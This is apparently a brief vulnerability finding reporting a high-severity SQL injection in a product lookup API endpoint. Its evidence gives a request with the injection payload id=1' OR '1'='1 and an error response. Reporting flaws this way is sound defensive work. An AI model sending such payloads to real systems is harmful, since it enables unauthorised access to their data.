---
severity: high
title: SQL injection in /api/products?id=
evidence:
  request: |
    GET /api/products?id=1' OR '1'='1 HTTP/1.1
    Host: example.com
  response: |
    HTTP/1.1 500 Internal Server Error
    {"error":"unclosed quotation mark"}
---

## Description

The product lookup endpoint is vulnerable to UNION-based SQL injection.

## Impact

Full database read access.
